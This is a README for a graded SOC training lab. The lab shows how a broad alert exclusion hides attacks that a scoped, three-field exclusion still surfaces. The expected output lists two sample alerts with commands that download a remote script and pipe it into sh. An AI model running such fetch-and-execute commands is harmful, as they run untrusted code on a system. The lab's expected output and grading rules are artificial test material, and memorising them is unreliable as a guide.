# m01l02-04 · A broad exclusion against a scoped one

**Lesson:** [Alert Triage, False Positive Reduction & Fatigue Mitigation](https://learnsome.tech/learn/secops-course/m01l02) (lesson 1.2, module 1: SOC Architecture & SIEM Engineering) · Free  
**Check:** Graded

## Goal

You can classify alert outcomes, find the rules that fill the queue, write a scoped exclusion that does not hide attackers, and group alerts into cases.

In the lesson: Here is what goes wrong when an exclusion is lazy. These few lines of Python apply the same test the exception uses: every listed field must equal its value. The suppress table holds two candidates. Broad hides any alert whose process name is sh, which is what a tired analyst writes at the end of a long night. Scoped is the three field version from the rule. The script loads four alerts in the shape of Falco's J S O N output. Two are the nightly backup. The other two are not. The hidden function returns true only when every field matches. Run both. Broad hides all four alerts, including a web pod whose Node process started a shell that pipes a download into sh. Scoped hides the two backups and still shows both attacks, even the one inside the backup pod, because its command line differs. A broad exclusion does not remove noise; it manufactures a false negative you will never see.

## Files

- [`starter/falco_alerts.jsonl`](starter/falco_alerts.jsonl)
- [`starter/suppress.py`](starter/suppress.py): the listing from the lesson
- [`expected.txt`](expected.txt): the output the check compares with
- [`check.json`](check.json): how `./check` runs and checks this lab

## Steps

1. Go to the starter: `cd labs/m01l02/m01l02-04/starter`
2. Read `suppress.py` the way the lesson builds it:
   - Lines 1–7: the suppress table holds two candidates
   - Lines 8–10: loads four alerts
   - Lines 11–13: the hidden function returns true
   - Lines 14–20: run both
3. Run it: `python3 suppress.py`.
4. Check it from the repository root: `./check m01l02-04`.

## Expected output

```text
broad: hides 4, shows 0
scoped: hides 2, shows 2
   shop/web-6c9f8d7b5-x2k4q node -> sh -c curl -s http://203.0.113.50/x | sh
   backup/db-backup-29550360 cron -> sh -c wget -qO- http://203.0.113.50/k | sh
```

## How to check

`./check m01l02-04` copies `starter/` into a scratch directory and runs `python3 suppress.py` there, the way the site's lab sandbox does: that directory is the working directory and `HOME`, `LANG=C.UTF-8`, `TZ=UTC`, a limit of 10 seconds and 256 KiB of output per stream.

It passes when the output matches `expected.txt` by the site's rules, within the limits. Standard output is compared line by line; spaces at the end of a line and blank lines at the end do not count. If that differs, standard output followed by standard error is compared with Python traceback frames and blank lines set aside, so a lesson that shows an error passes when your program prints the same error. A pass here is a pass on the site.

---

[Open the lesson on LearnSome.tech](https://learnsome.tech/learn/secops-course/m01l02) · [All labs of this lesson](../README.md) · [Course README](../../../README.md)
